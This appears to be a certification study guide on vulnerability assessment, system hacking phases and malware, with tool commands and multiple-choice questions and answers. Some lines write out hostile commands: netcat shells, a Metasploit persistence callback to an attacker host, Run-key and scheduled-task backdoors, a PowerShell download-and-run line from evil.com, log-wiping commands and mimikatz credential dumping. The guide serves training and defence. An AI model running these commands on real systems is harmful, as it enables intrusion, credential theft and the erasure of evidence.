# Domain 3: System Hacking Phases and Attack Techniques

## Sub-Domain: Vulnerability Analysis

---

## Vulnerability Assessment Concepts

**Core Concept:** Vulnerability assessment identifies, classifies, and prioritizes vulnerabilities in systems. Attackers use these to find weaknesses; defenders assess to patch them. It is a proactive security process.

**Key Tools:** Nessus (`nessuscli scan new` or via GUI), OpenVAS (`gvm-cli --create-task`), Nikto (`nikto -h http://target.com`).

**Port Numbers & Protocols:** N/A (assessment tools often scan common ports).

**Common Pitfalls:**
- Vulnerability assessment is not the same as penetration testing; it is a broader process of scanning and reporting, while pen testing includes exploitation.
- A VA can be automated, but pen testing requires human skill.

**Countermeasures:** Perform regular vulnerability scans, maintain an asset inventory, and implement a patch management process.

**Practice Question:**

A security team runs a Nessus scan and receives a report listing CVSS scores for each finding. What does the CVSS score represent?
- A) The severity of the vulnerability
- B) The exploitability index
- C) The vendor's patch priority
- D) The network criticality

> **Answer: A** -- CVSS (Common Vulnerability Scoring System) quantifies severity.
---

## Vulnerability Classification and Assessment Types

**Core Concept:** Vulnerabilities are classified by type (misconfiguration, missing patches, default passwords, design flaws). Assessment types include network-based, host-based, application-layer, and wireless. Attackers often target known CVE listings.

**Key Tools:** Nmap NSE (`--script vuln`), Nessus (credentialed vs non-credentialed), Qualys.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Credentialed scans provide more accurate results (fewer false positives) because they log in and assess from inside.
- Non-credentialed scans run from external view.
- Credentialed scans find missing patches more reliably.

**Countermeasures:** Regular credentialed scans, patch management, configuration baselines, and security hardening.

**Practice Question:**

An auditor wants to detect missing security patches on 100 Windows servers. Which assessment approach yields the most reliable results?
- A) Credentialed scan with local admin rights
- B) Social engineering test
- C) Phishing simulation
- D) Unauthenticated network scan

> **Answer: A** -- With credentials, the scanner can query the OS for installed patches directly, reducing false positives.
---

## Vulnerability Assessment Tools

**Core Concept:** Tools automate the scanning process. EC-Council covers Nessus, OpenVAS, GFI LanGuard, Qualys, Nexpose, and Nikto (web). They identify vulnerabilities, misconfigurations, and compliance issues.

**Key Tools:**
- **Nessus**: `nessuscli scan new --name "MyScan" --target 192.168.1.1`
- **OpenVAS**: `gvm-cli socket --xml "<create_task>...</create_task>"`
- **Nikto**: `nikto -h 10.0.0.1 -p 80`

**Port Numbers & Protocols:** Nessus web interface: 8834. OpenVAS: 9392.

**Common Pitfalls:**
- **Nikto** is specifically for web server scanning.
- **Nessus/OpenVAS** are general network vulnerability scanners.
- GFI LanGuard is often used for patch management and network auditing.

**Countermeasures:** Use these tools for self-assessment, but also rely on manual validation to avoid false negatives.

**Practice Question:**

Which vulnerability assessment tool is specifically designed to test web servers for dangerous files and misconfigurations?
- A) OpenVAS
- B) Nessus
- C) Nikto
- D) Wireshark

> **Answer: C** -- Nikto is a web server scanner.
---

## Vulnerability Assessment Reports

**Core Concept:** Reports translate technical findings into actionable items. They typically include executive summary, methodology, findings with risk ratings, and remediation steps.

**Key Tools:** Dradis (reporting framework), Faraday, MagicTree. Many scanners generate built-in PDF/HTML reports.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- The most critical part of a report for management is the executive summary with risk prioritization.
- Technical details are for IT staff.
- False positives should be minimized and noted.

**Countermeasures:** Validate findings, track remediation with a ticketing system, and conduct re-scans to verify fixes.

**Practice Question:**

A vulnerability report identifies a critical remote code execution flaw with a CVSS of 9.8. What is the best first action for the recipient?
- A) Disable the server's firewall
- B) Shut down the server permanently
- C) Immediately apply the vendor patch or mitigation
- D) Ignore it if the server is not internet-facing

> **Answer: C** -- The high-risk vulnerability should be patched or mitigated according to the organization's change management.
---

## Sub-Domain: System Hacking

---

## System Hacking Concepts

**Core Concept:** System hacking is the phase where attackers exploit vulnerabilities to gain unauthorized access to a system. It includes gaining access, escalating privileges, maintaining access (backdoors), and clearing tracks. The goal is to get root/admin control.

**The Four Phases:**
1. **Gaining Access** -- initial breach
2. **Escalating Privileges** -- elevate to admin/root
3. **Maintaining Access** -- install backdoors for persistence
4. **Clearing Tracks** -- delete logs to hide

**Key Tools:** Metasploit, John the Ripper, Hydra, mimikatz, WinPEAS/LinPEAS, wevtutil, netcat.

**Port Numbers & Protocols:** Commonly attacked: SMB 445, RDP 3389, SSH 22, FTP 21, HTTP 80.

**Common Pitfalls:**
- Countermeasure: Strong authentication, patching, least privilege, audit logging to a remote server.

**Practice Question:**

An attacker has a limited user shell on a Linux box. Which action is part of the "Escalating Privileges" phase?
- A) Running a kernel exploit to gain root
- B) Cracking the root password using John the Ripper
- C) Deleting the bash history
- D) Installing a keylogger

> **Answer: A** -- Exploiting a kernel vulnerability to elevate privileges is privilege escalation.
---

## Gaining Access

**Core Concept:** Gaining access is the initial breach into a system, typically through exploiting vulnerabilities, cracking passwords, or social engineering. It can be at OS level (command shell) or application level.

**Key Tools:**
- **Metasploit**: `use exploit/windows/smb/ms17_010_eternalblue`
- **Hydra**: `hydra -l admin -P pass.txt 192.168.1.1 ssh`
- **Netcat**: `nc victim_ip 1234 -e /bin/sh`
- **CrackMapExec**: `crackmapexec smb target -u users.txt -p Password1`

**Port Numbers & Protocols:** SMB 445, RDP 3389, SSH 22, FTP 21, HTTP 80.

**Common Pitfalls:**
- Remote exploitation happens over the network; local exploitation requires prior access.
- Gaining access often results in a shell.
- Countermeasure: Patching, strong passwords, network segmentation, MFA.

**Practice Question:**

An attacker exploits a web application's file upload vulnerability to upload a PHP web shell, then navigates to the shell URL and executes commands. Which phase of system hacking just occurred?
- A) Clearing tracks
- B) Gaining access
- C) Maintaining access
- D) Privilege escalation

> **Answer: B** -- The attacker just gained access (command execution) via the web shell.
---

## Password Cracking

**Core Concept:** Password cracking is the process of recovering passwords from stored or transmitted data. Techniques include dictionary attacks, brute force, hybrid, rule-based, and rainbow tables. Attackers target the SAM file, /etc/shadow, and network authentication hashes.

**Key Tools:**
- **Mimikatz**: `sekurlsa::logonpasswords`
- **Hashcat**: `hashcat -m 1000 hashes.txt rockyou.txt` (cracking NTLM)
- **John**: `john --format=NT hashes.txt`
- **Hydra**: `hydra -l admin -P list.txt ssh://target` (online brute-force)
- **CeWL**: `cewl target.com` (custom wordlist generator from website)

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- LM hashes are weak and disabled in Vista+.
- NTLM hash is used for authentication.
- Rainbow tables trade time for storage; using salt defeats rainbow tables.
- Dictionary vs brute-force: dictionary uses a wordlist; brute-force tries all combinations.

**Countermeasures:** Strong password policy, account lockout, salting, multi-factor authentication.

**Practice Question:**

A security analyst obtains an NTLM hash "B4B9B02E6F09A9BD760F388B67351E2B". Which tool can most efficiently crack it with a precomputed table?
- A) Wireshark
- B) RainbowCrack
- C) Hydra
- D) Netcat

> **Answer: B** -- RainbowCrack uses precomputed rainbow tables for fast lookup.
---

## Vulnerability Exploitation

**Core Concept:** Exploitation leverages a vulnerability to execute arbitrary code or commands. Attackers use exploit frameworks (Metasploit) or manually crafted proof-of-concept code. The exploit must match the vulnerability and target architecture.

**Key Tools:**
- **Metasploit**: `search struts2`, `use exploit/multi/http/struts2_content_type_ognl`, `set RHOSTS`, `exploit`
- **Searchsploit** (Exploit-DB): `searchsploit apache 2.4`
- **Immunity Debugger** for exploit development
- **Mona.py** for pattern creation

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Payloads: **singles** (self-contained), **stagers** (small, download larger stage), **stages** (the full payload).
- Meterpreter is an advanced payload.
- Countermeasure: Patch promptly, use intrusion prevention systems, and application whitelisting.

**Practice Question:**

In Metasploit, which command would you use to list all available exploits for a specific vendor?
- A) `use auxiliary/scanner/portscan`
- B) `show exploits`
- C) `search name:Microsoft`
- D) `setg RHOSTS`

> **Answer: C** -- `search` with keywords filters modules.
---

## Escalating Privileges

**Core Concept:** After initial access (often with limited user), attackers elevate to Administrator/root to gain full control. Techniques include kernel exploits, misconfigured services, Windows token manipulation (UAC bypass), DLL hijacking, and sudo misconfigurations.

**Key Tools:**
- **Windows**: PowerUp (`Invoke-AllChecks`), SharpUp, winPEAS
- **Linux**: linpeas.sh, LinEnum
- **Metasploit**: `getsystem` command
- **Kernel exploits**: precompiled executables (e.g., CVE-2021-3156 sudoedit)
- **GTFO Bins**: reference for sudo exploitation

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Unquoted service path is a classic Windows privilege escalation vector.
- UAC bypass is needed for admin tasks if admin but not elevated.
- In Linux, SUID bit misconfiguration allows executing as owner.
- Countermeasure: Apply least privilege, patch kernel, proper service configurations, and audit sudo rights.

**Practice Question:**

A hacker has a low-privilege shell on a Windows 10 machine and runs `whoami /priv` to see SeImpersonatePrivilege enabled. What attack is most suitable?
- A) SQL injection
- B) Pass the hash
- C) Potato attack (Juicy/Rotten)
- D) DLL hijacking

> **Answer: C** -- SeImpersonatePrivilege can be exploited with potato attacks to get SYSTEM token.
---

## Maintaining Access

**Core Concept:** Attackers ensure they can return to the compromised system even if the initial vulnerability is patched. They install backdoors, create new user accounts, open listener ports, or use remote administration tools.

**Key Tools:**
- **Metasploit persistence**: `run persistence -U -i 10 -p 4444 -r attacker_IP`
- **Windows registry**: `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\backdoor.exe`
- **Netcat**: `nc -lvp 4444 -e cmd.exe`
- **RATs**: DarkComet, njRAT
- **SSH backdoor**: ssh-keygen and copy to victim's `~/.ssh/authorized_keys`

**Port Numbers & Protocols:** Known backdoor ports: NetBus 12345, SubSeven 27374.

**Common Pitfalls:**
- Countermeasure: Monitor for new user accounts, unusual processes, port scans, and check startup directories and scheduled tasks.

**Practice Question:**

A penetration tester successfully gains SYSTEM access on a server and wants to maintain access without detection. Which method is stealthiest?
- A) Open a port in firewall
- B) Install a new Windows service with a misleading name
- C) Create a new domain admin account
- D) Add a cron job calling back to a C2 server using HTTPS

> **Answer: D** -- A scheduled callback over an encrypted channel is harder to detect than new services or accounts.
---

## Executing Applications

**Core Concept:** Attackers execute malicious applications (keyloggers, spyware, trojans) on the compromised system to gather data, cause damage, or further the attack. This often happens after gaining access and privilege escalation.

**Key Tools:**
- **Metasploit**: `upload /path/to/malware.exe C:\\Windows\\Temp` then `execute -f malware.exe`
- **PsExec**: `psexec \\target -u admin -p pass cmd`
- **PowerShell**: `powershell -ExecutionPolicy Bypass -File evil.ps1`

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Remote execution tools: PsExec, WMIC.
- DLL injection runs code in another process.
- Countermeasure: Application whitelisting (AppLocker, WDAC), antivirus, and endpoint detection.

**Practice Question:**

An attacker wants to run a malicious binary on a compromised Windows target without leaving it on disk. Which technique is most appropriate?
- A) Copy the exe to startup folder
- B) Fileless execution using PowerShell to reflectively load the binary in memory
- C) Install as a service
- D) Schedule a task to run the exe

> **Answer: B** -- Fileless execution keeps the payload only in memory, evading disk forensics.
---

## Hiding Files

**Core Concept:** Attackers hide malicious files to evade detection by users and antivirus. Techniques include NTFS Alternate Data Streams (ADS), steganography, hidden attributes, rootkits, and fileless storage.

**Key Tools:**
- **ADS**: `type calc.exe > readme.txt:calc.exe` then `start .\readme.txt:calc.exe`
- **Steganography**: OpenStego, Snow (whitespace), Steghide (`steghide embed -cf image.jpg -ef secret.txt`)
- **Rootkits**: Hacker Defender (userland)
- **Linux**: `mv malware .malware` (hidden files with dot prefix)

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- ADS only works on NTFS.
- Detecting ADS using `dir /r` or streams.exe.
- Countermeasure: File integrity monitoring, AV that scans ADS.

**Practice Question:**

A suspect's machine has a file picture.jpg. Forensic analysis reveals hidden data within it using steghide. What technique was used?
- A) Rootkit
- B) Alternate Data Streams
- C) Encryption
- D) Steganography

> **Answer: D** -- Steganography hides data inside another file.
---

## Establishing Persistence

**Core Concept:** Persistence ensures that the attacker's access survives reboots and logoffs. Common methods include registry Run keys, scheduled tasks, startup folder, Windows services, WMI event subscriptions, and cron jobs.

**Key Tools:**
- **Metasploit**: `run persistence -X` (install as service)
- **Manual**: `schtasks /create /tn "Update" /tr C:\temp\backdoor.exe /sc hourly`
- **Registry**: `reg add HKLM\...\Run /v "Updater" /d C:\backdoor.exe`
- **Linux**: `crontab -e` add `*/10 * * * * /tmp/backdoor`

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- EC-Council tests registry paths for startup.
- WMI permanent event subscription is a stealthier method.
- Countermeasure: Monitor startup locations, enable AppLocker, restrict user privileges, and review scheduled tasks.

**Practice Question:**

Which Windows registry key is commonly used for per-machine persistence that runs a program at every logon for any user?
- A) `HKLM\System\CurrentControlSet\Services`
- B) `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- C) `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- D) `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

> **Answer: B** -- HKLM...\Run runs for all users. (A is a services key, not a startup-run key; C runs once then is deleted; D only affects the current user.)
---

## Clearing Logs

**Core Concept:** Attackers delete or modify logs to remove evidence of their presence and activities. They target system logs (Windows Event Log, Linux syslog), application logs, and shell histories.

**Key Tools:**
- **Windows**: `wevtutil cl System`, `wevtutil cl Security`, `Clear-EventLog -LogName Security` (PowerShell)
- **Metasploit**: `clearev` command in Meterpreter
- **Linux**: `shred -zu /var/log/*`, `rm -rf /var/log`, `history -c`
- **Timestomp**: Metasploit's `timestomp` to change file timestamps

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Log cleaning is the final phase of the hacking methodology.
- Countermeasure: Centralized logging to a remote syslog server or SIEM, which attackers cannot delete if properly configured, and frequent log backups.

**Practice Question:**

An attacker uses Meterpreter and types `clearev`. What is the effect?
- A) Deletes all files in the current directory
- B) Removes the attacker's user account
- C) Clears the Windows Application, System, and Security event logs
- D) Disables Windows Firewall

> **Answer: C** -- Meterpreter's `clearev` command wipes event logs.
---

## Sub-Domain: Malware Threats

---

## Malware Concepts

**Core Concept:** Malware is malicious software designed to damage, disrupt, or gain unauthorized access. Types include viruses, worms, trojans, ransomware, spyware, rootkits, and adware. Malware can be polymorphic to evade signature detection.

**Key Tools:** Analysis: IDA Pro, OllyDbg, Ghidra. Detection: Windows Defender, ClamAV. Sandbox: Cuckoo Sandbox, Any.Run. Malware samples: VirusTotal.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- A **virus** requires user interaction to spread (e.g., opening a file); a **worm** self-propagates across networks.
- A **trojan** masquerades as legitimate software.
- **Ransomware** restricts access and demands payment.
- Countermeasure: Antivirus, email filtering, user awareness, least privilege.

**Practice Question:**

A malicious program spreads automatically by exploiting a vulnerability in SMB, without any user action. This program is classified as:
- A) Adware
- B) Virus
- C) Worm
- D) Trojan

> **Answer: C** -- Worm propagates itself over network with no user interaction.
---

## APT Concepts

**Core Concept:** Advanced Persistent Threats (APTs) are sophisticated, long-term cyberattacks by nation-states or organized groups to steal data or sabotage. They use multi-stage, custom malware and maintain long-term presence.

**Key Tools:** Common APT malware: Stuxnet (worm targeting ICS), Duqu, Flame. Analysis: threat intelligence platforms, Cuckoo Sandbox. C2 frameworks: Cobalt Strike, Empire.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- APTs are characterized by being targeted, long-term, and well-funded.
- Difference from general malware: targeting, persistence, sophistication.
- Countermeasure: Defense-in-depth, network segmentation, advanced threat detection (EDR, NTA), regular security audits.

**Practice Question:**

A government agency discovers that a sophisticated attacker has been exfiltrating classified documents for 18 months using custom malware that evaded standard antivirus. This is an example of:
- A) An advanced persistent threat
- B) A DDoS attack
- C) A phishing campaign
- D) A script kiddie attack

> **Answer: A** -- APT due to long-term, targeted, custom malware.
---

## Trojan Concepts

**Core Concept:** A Trojan is a program that appears useful but performs malicious actions hidden from the user. They do not replicate themselves. They create backdoors, steal data, or download other malware.

**Key Tools:**
- **RATs**: njRAT, DarkComet, Poison Ivy
- **Detection**: `netstat -ano` to see unusual outbound connections
- **Known trojan ports**: NetBus 12345, SubSeven 27374, Back Orifice 31337

**Port Numbers & Protocols:** NetBus 12345, SubSeven 27374, Back Orifice 31337.

**Common Pitfalls:**
- Trojans do not self-replicate (unlike viruses/worms).
- Wrappers bind the trojan with a legitimate program.
- Trojan types: remote access, data-sending, destructive, proxy, FTP.
- Countermeasure: Do not run untrusted executables, use software from official sources, AV.

**Practice Question:**

A suspicious process on a Windows host connects to a remote IP on port 31337. This port is commonly associated with which trojan?
- A) Beast
- B) Back Orifice
- C) SubSeven
- D) NetBus

> **Answer: B** -- Back Orifice default port is 31337.
---

## Virus and Worm Concepts

**Core Concept:** A virus attaches itself to a legitimate program or file and requires user action to spread. A worm is a standalone malware that spreads automatically over networks. Both can carry payloads (destructive or data theft).

**Key Tools:** Macro virus: VBA macros in Office. Creation tools: JPS Virus Maker. Analysis: strings, PEiD. Detection: signature-based AV, heuristic analysis.

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- A **logic bomb** triggers on a specific condition (date, event).
- A **multipartite virus** infects both boot sector and executables.
- **Stealth virus** hides modifications.
- **Polymorphic virus** changes its code signature.
- Countermeasure: Updated antivirus, disable macros in Office, patch systems against worm exploits.

**Practice Question:**

A malware that infects the boot sector of a hard drive and executable files is classified as:
- A) Multipartite virus
- B) Worm
- C) Macro virus
- D) Polymorphic virus

> **Answer: A** -- Multipartite virus infects multiple vectors (boot sector + files).
---

## Fileless Malware Concepts

**Core Concept:** Fileless malware resides entirely in memory and uses legitimate system tools (PowerShell, WMI) to execute malicious actions, avoiding writing to disk. This evades traditional file-based antivirus.

**Key Tools:**
- PowerShell Empire, PowerSploit, Cobalt Strike (`execute-assembly`)
- Command: `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"`
- Defense: ETW (Event Tracing for Windows), AMSI (Antimalware Scan Interface)

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Fileless malware uses registry for persistence (e.g., storing script in registry keys).
- It exploits living-off-the-land binaries (LOLBins) like regsvr32, rundll32, mshta.
- Countermeasure: Enable PowerShell logging, constrained language mode, application whitelisting, and monitor for unusual process command lines.

**Practice Question:**

A security tool detects a PowerShell process making a network connection to a known malicious IP, but no new files are found on disk. What type of attack is likely occurring?
- A) Trojan
- B) Rootkit
- C) Worm
- D) Fileless malware

> **Answer: D** -- Fileless malware lives in memory, uses PowerShell to download and run code without writing to disk.
---

## Malware Analysis

**Core Concept:** Malware analysis determines malware functionality, origin, and impact. It has two main types: **static** (analyzing code without execution) and **dynamic** (running in a sandbox). Both are essential for creating signatures and understanding threats.

**Key Tools:**
- **Static**: `strings malware.exe`, PEiD, CFF Explorer, `objdump -d malware`, IDA Pro, Ghidra
- **Dynamic**: Process Monitor (procmon), Wireshark, Regshot, FakeNet (simulated network)
- **Sandboxes**: Cuckoo Sandbox, Joe Sandbox, Any.Run (online)

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Static analysis can be defeated by packing/obfuscation.
- A packed executable has high entropy.
- Dynamic analysis observes behavior: API calls (CreateFile, RegSetValue).
- Countermeasure: Organizations should have malware analysis capability for incident response.

**Practice Question:**

An analyst uses `strings` on a suspicious binary but sees very few readable strings and notices the .text section has high entropy. What does this indicate?
- A) The binary is clean
- B) The binary is a text file
- C) The binary is 64-bit
- D) The binary is likely packed or encrypted

> **Answer: D** -- Packing compresses/encrypts the code, reducing readable strings and increasing entropy.
---

## Malware Countermeasures

**Core Concept:** Defense against malware includes a layered approach: endpoint protection (antivirus, EDR), email filtering, web filtering, patch management, user awareness, least privilege, and application whitelisting.

**Key Tools:**
- Windows Defender: `MpCmdRun -Scan -ScanType 2`
- AppLocker: rules to allow only signed executables
- Software Restriction Policies
- YARA rules for custom detection
- Email gateways: Mimecast, Proofpoint

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- The most effective single countermeasure is user education (do not click suspicious links).
- Regular updates and backups are critical.
- For fileless malware: enable AMSI, PowerShell logging.
- For worms: network segmentation and patching.

**Practice Question:**

Which configuration best prevents a macro virus from executing in a corporate environment?
- A) Use strong passwords
- B) Install antivirus
- C) Block port 25
- D) Disable all macros in Office documents, enable only with notification or digital signatures

> **Answer: D** -- Disabling macros by default blocks the initial infection vector.
---

## Anti-Malware Software

**Core Concept:** Anti-malware software includes antivirus, anti-spyware, and EDR solutions that detect, block, and remove malicious software using signature-based, heuristic, and behavioral analysis.

**Key Tools:**
- Windows Defender: `MpCmdRun -Scan -ScanType 1` (quick scan)
- ClamAV (Linux): `clamscan -r /home`
- Malwarebytes, Kaspersky, McAfee
- EDR: CrowdStrike Falcon, SentinelOne

**Port Numbers & Protocols:** N/A

**Common Pitfalls:**
- Heuristic detection can catch unknown (zero-day) malware.
- **False positive**: clean file flagged as malicious.
- **False negative**: malware not detected.
- Signature-based detection cannot detect new variants.

**Practice Question:**

A new ransomware variant not in any antivirus database encrypts files on an endpoint with EDR. The EDR detects the activity because it monitors the rate of file modifications and blocks the process. This type of detection is:
- A) Signature-based
- B) Firewall rule
- C) Heuristic/behavioral
- D) DNS filtering

> **Answer: C** -- The EDR used behavior (mass file changes) to identify the threat.